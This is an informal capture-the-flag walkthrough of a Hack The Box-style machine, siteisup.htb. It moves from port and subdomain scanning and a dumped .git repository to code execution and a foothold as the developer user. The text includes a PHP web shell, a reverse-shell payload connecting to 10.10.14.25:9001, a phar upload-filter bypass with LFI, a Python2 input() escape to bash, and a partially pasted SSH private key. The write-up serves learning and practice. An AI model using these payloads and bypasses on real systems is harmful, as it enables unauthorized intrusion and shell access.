```
sudo nmap -sS -sV -p- 10.10.11.177

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 14:18 EDT
Nmap scan report for 10.10.11.177
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
hmm i check the site and i see on it says siteisup.htb..... i add it to my etc/hosts and run a subdomain search:
```
wfuzz -u http://10.10.11.177 -H "Host:FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.177/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000000001:   200        39 L     93 W       1131 Ch     "www"                                               
000000019:   403        9 L      28 W       281 Ch      "dev"                                               
000000015:   200        39 L     93 W       1131 Ch     "ns"                                                
000000007:   200        39 L     93 W       1131 Ch     "webdisk"                                           
000000003:   200        39 L     93 W       1131 Ch     "ftp"                                               
000000013:   200        39 L     93 W       1131 Ch     "autodiscover"                                      
000000009:   200        39 L     93 W       1131 Ch     "cpanel"                                            
000000010:   200        39 L     93 W       1131 Ch     "whm"                                               
000000011:   200        39 L     93 W       1131 Ch     "ns1"                                               
000000012:   200        39 L     93 W       1131 Ch     "ns2" 
...
```

there is a lot but only one to not return 200 was dev... ill add that to my etc/hosts as well and check it out.

.....still just get forbidden

Lets try to gobuster see if we can find any paths:
```
gobuster dir -u http://siteisup.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
/index.php            (Status: 200) [Size: 1131]
/index.php            (Status: 200) [Size: 1131]
/server-status        (Status: 403) [Size: 277]
Progress: 18976 / 18980 (99.98%)
===============================================================
Finished
===============================================================
```

welp, 2/2 on dev lol
opens to a blank page.... lets give gobuster another try with this included:

BANG!
```
gobuster dir -u http://siteisup.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/logs/.php       (Status: 403) [Size: 277]
/.git/logs/.html      (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.git/config          (Status: 200) [Size: 298]
/.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
/.git/index           (Status: 200) [Size: 521]
/.git/HEAD            (Status: 200) [Size: 21]
/.git/logs/           (Status: 200) [Size: 1143]
/index.php            (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 0]
Progress: 18976 / 18980 (99.98%)
===============================================================
Finished
===============================================================
```

found the git repo:
lets check it out
`wget -r -np -nH --cut-dirs=2 --reject "index.html*" http://siteisup.htb/dev/.git/`

```
ls    

branches  config  description  HEAD  hooks  index  info  logs  objects  packed-refs  refs

```

now that i have repo locally, lets go thru the commits first as i dont see anything after my initial search thru the dirs:
```
git log                                                            
commit 010dcc30cc1e89344e2bdbd3064f61c772d89a34 (HEAD -> main, origin/main, origin/HEAD)
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:51 2021 +0200

    Delete index.php

commit c8fcc4032487eaf637d41486eb150b7182ecd1f1
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:08 2021 +0200

    Update checker.php

commit f67efd00c10784ae75bd251add3d52af50d7addd
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:33:11 2021 +0200

    Create checker.php

commit ab9bc164b4103de3c12ac97152e6d63040d5c4c6
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:58 2021 +0200

    Update changelog.txt

commit 60d2b3280d5356fe0698561e8ef8991825fec6cb
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:30:39 2021 +0200

    Create admin.php

commit c1998f8fbe683dd0bee8d94167bb896bd926c4c7
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:29:45 2021 +0200

    Add admin panel.

commit 35a380176ff228067def9c2ecc52ccfe705de640
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:40:49 2021 +0200

    Update changelog.txt

commit 57af03ba60cdcfe443e92c33c188c6cecb70eb10
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:29:42 2021 +0200

    Create index.php

commit 354fe069f6205af09f26c99cfe2457dea3eb6a6c
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 17:28:48 2021 +0200

    Delete .htpasswd

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.

commit 61e5cc0550d44c08b6c316d4f04d3fcc7783ae71
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:48 2021 +0200

    Update index.php

commit 3d66cd48933b35f4012066bcc7ee8d60f0069926
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:45:18 2021 +0200

    Create changelog.txt

commit 4fb192727c29c158a659911aadcdcc23e4decec5
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:28:26 2021 +0200

    Create stylesheet.css

commit 6f89af70fd23819664dd28d764f13efc02ecfd88
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:40 2021 +0200

    Create index.php

commit 8d1beb1cf5a1327c4cdb271b8efb1599b1b1c87f
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:05:08 2021 +0200

    Create .htpasswd

commit 6ddcc7a8ac393edb7764788c0cbc13a7a521d372
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 15:04:38 2021 +0200

    Create .htaccess
```

hmmm this is interesting:
```
git show bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 3190432..44ff240 100644
--- a/.htaccess
+++ b/.htaccess
@@ -1,5 +1,4 @@
-AuthType Basic
-AuthUserFile /var/www/dev/.htpasswd
-AuthName "Remote Access Denied"
-Require ip 127.0.0.1 ::1
-Require valid-user
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header

```

this as well:
```
git show c1998f8fbe683dd0bee8d94167bb896bd926c4c7
commit c1998f8fbe683dd0bee8d94167bb896bd926c4c7
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:29:45 2021 +0200

    Add admin panel.

diff --git a/index.php b/index.php
index c41432c..32eeeee 100644
--- a/index.php
+++ b/index.php
@@ -1,9 +1,12 @@
 <b>This is only for developers</b>
 <br>
+<a href="?page=admin">Admin Panel</a>
 <?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
-       }
+       }else{
+               include("checker.php");
+       }       
 ?> 
```

checker.php:
```
git show f67efd00c10784ae75bd251add3d52af50d7addd
commit f67efd00c10784ae75bd251add3d52af50d7addd
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 18:33:11 2021 +0200

    Create checker.php

diff --git a/checker.php b/checker.php
new file mode 100644
index 0000000..aa9aa44
--- /dev/null
+++ b/checker.php
@@ -0,0 +1,116 @@
+<?php
+if(DIRECTACCESS){
+       die("Access Denied");
+}
+?>
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset='utf-8' />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
+    <title>Is my Website up ? (beta version)</title>
+  </head>
+
+  <body>
+
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
+          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
+        </header>
+    </div>
+
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <form method="post" enctype="multipart/form-data">
+                           <label>List of websites to check:</label><br><br>
+                               <input type="file" name="file" size="50">
+                               <input name="check" type="submit" value="Check">
+               </form>
+
+<?php
+
+function isitup($url){
+       $ch=curl_init();
+       curl_setopt($ch, CURLOPT_URL, trim($url));
+       curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
+       curl_setopt($ch, CURLOPT_HEADER, 1);
+       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+       curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+       curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+       $f = curl_exec($ch);
+       $header = curl_getinfo($ch);
+       if($f AND $header['http_code'] == 200){
+               return array(true,$f);
+       }else{
+               return false;
+       }
+    curl_close($ch);
+}
+
+if($_POST['check']){
+  
+       # File size must be less than 10kb.
+       if ($_FILES['file']['size'] > 10000) {
+        die("File too large!");
+  }
+       $file = $_FILES['file']['name'];
+       
+       # Check if extension is allowed.
+       $ext = getExtension($file);
+       if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+               die("Extension not allowed!");
+       }
+  
+       # Create directory to upload our file.
+       $dir = "uploads/".md5(time())."/";
+       if(!is_dir($dir)){
+        mkdir($dir, 0770, true);
+  }
+  
+  # Upload the file.
+       $final_path = $dir.$file;
+       move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
+       
+  # Read the uploaded file.
+       $websites = explode("\n",file_get_contents($final_path));
+       
+       foreach($websites as $site){
+               $site=trim($site);
+               if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
+                       $check=isitup($site);
+                       if($check){
+                               echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
+                       }else{
+                               echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
+                       }       
+               }else{
+                       echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
+               }
+       }
+       
+  # Delete the uploaded file.
+       @unlink($final_path);
+}
+
+function getExtension($file) {
+       $extension = strrpos($file,".");
+       return ($extension===false) ? "" : substr($file,$extension+1);
+}
+?>
+      </section>
+    </div>
+
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        <p class="copyright">siteisup.htb (beta)</p><br>
+        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
+      </footer>
+    </div>
+
+  </body>
+</html>
```

all is looking good, let me find these files in here as i must have missed them....

so again files looks pretty much same to the git logs....

i used burpsuite to intercept request to dev.siteisup.htb and added the header in there:
`Special-Dev:"only4dev"`
.....
turns out later this would not work i have to add it to the proxy settings and append the header:
![[Pasted image 20250815105516.png]]
bang i now am not getting 403 forbidden but the site where i can upload a file!

lets make a file that can bypass the filter above:

```
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+               die("Extension not allowed!");
+       }
```

```
<?php system($_GET['cmd']); ?>
```
into:
`shell.phar`
....

i could not get code execution for a while so i looked at a oxdf's write up and got this shell:
```
<?php
        $descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9001 0>&1'";
        $proc = proc_open($cmd, $descspec, $pipes);
```

cause proc_open is a vuln command and so we can abuse it to get a rev shell :)

and we zip it like so :
` zip rev.txt rev.php`

then upload!

i go to:
```
http://dev.siteisup.htb/?page=phar://uploads/46fd82b846789be9e55c4e4ba751e6c8/rev.txt/rev
```

catch shell!

ok now that we are in i look for user.txt in developer folder(that seems to be the only other user in home dir)
permission denied to open user.txt

there is a dev folder and in it there seems to be a binary and a python2 script cause no parentheses around print :
```
import requests
url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
print "Website is up"
else:
print "Website is down"
```

input is vuln so what we can do is run this script and have it spawn a bash shell:
```
./siteisup
__import__('os').system('/bin/bash')
```

```
whoami
developer
```

this is not a stable shell and also it will not let me read user.txt once again XD

i can tho get the private ssh key to get a more stable shell as we know port 22 is open:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
srrKvTpAQkPrvfioShtIpo95Gfyx6Bj2MKJ6QuhiJK+O2zYm0z2ujjCXuM3V4Jb0I1Ud+q
a+QtxTsNQVpcIuct06xTfVXeEtPThaLI5KkXElx+TgwR0633jwRpfx1eVgLCxxYk5CapHu
u0nhUpICU1FXr6tV2uE1LIb5TJrCIx479Elbc1MPrGCksQVV8EesI7kk5A2SrnNMxLe2ck
IsQHQHxIcivCCIzB4R9FbOKdSKyZTHeZzjPwnU+FAAAFiHnDXHF5w1xxAAAAB3NzaC1yc2
EAAAGBAJrweNE1jPHrtJ+hTs4sUwNaUN/UqcGMq2Aoyqw7afIORNORBHCcP0taovTxaDb8
5Le1Mt/vusQ3feboAHbbkS+6swNN8UjZKp7dh4IygDzq+nLSLzA6YfCXgRdhfUsuF67Xwj
++vlqc5sU+7rbxg9DdQGN/hBkaTm+6ufV9KXD0ZyFJ8btrDfryF43xr6ogGKMzgeQ3l/K2
9m5Ioukt0NbTNVVA6Fu3AkW5wTIJZthVxCVPZRL/T8tg+AWrxb6FKrU/GgqLK6yr06QEJD
6734qEobSKaPeRn8segY9jCiekLoYiSvjts2JtM9ro4wl7jN1eCW9CNVHfqmvkLcU7DUFa
XCLnLdOsU31V3hLT04WiyOSpFxJcfk4MEdOt948EaX8dXlYCwscWJOQmqR7rtJ4VKSAlNR
V6+rVdrhNSyG+UyawiMeO/RJW3NTD6xgpLEFVfBHrCO5JOQNkq5zTMS3
....
```

ill go back to kali and make a dev_id_rsa file and paste in this private key and run:
```
chmod 600 dev_id_rsa
``` 

and then finally run:
```
ssh -i dev_id_rsa developer@10.10.11.177
```

spawns a nice ssh shell thank god!

i am able to read user.txt with this good shell now!

User pwn!

---
### Priv Esc

Off rip run :
`sudo -l`

to see if we can abuse sudo:
```
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

`/usr/local/bin/easy_install`

seems to be it! 

lets take over!

